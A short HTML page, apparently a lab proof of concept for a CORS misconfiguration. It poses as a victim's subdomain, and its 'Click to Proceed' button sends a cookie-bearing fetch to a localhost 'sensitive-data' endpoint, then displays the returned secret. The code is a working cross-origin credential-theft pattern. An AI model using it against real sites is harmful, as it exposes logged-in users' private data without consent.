<!DOCTYPE html>
<html>
<head>
    <title>Subdomain of Victim</title>
</head>
<body>
    <h1>Subdomain: sub.victim.com</h1>
    <button onclick="RequestData()">Click to Proceed</button>
    <p id="output"></p>
    <script>
        function RequestData() {
            fetch("http://localhost:3000/sensitive-data", {
                method: "GET",
                credentials: "include"  // Ensures cookies are sent
            })
            .then(response => response.json())
            .then(data => {
                document.body.innerHTML += `<p>Accessed Secret Data: ${data.secret}</p>`;
            })
            .catch(error => console.error("Failed to fetch data:", error));
        }
    </script>
</body>
</html>
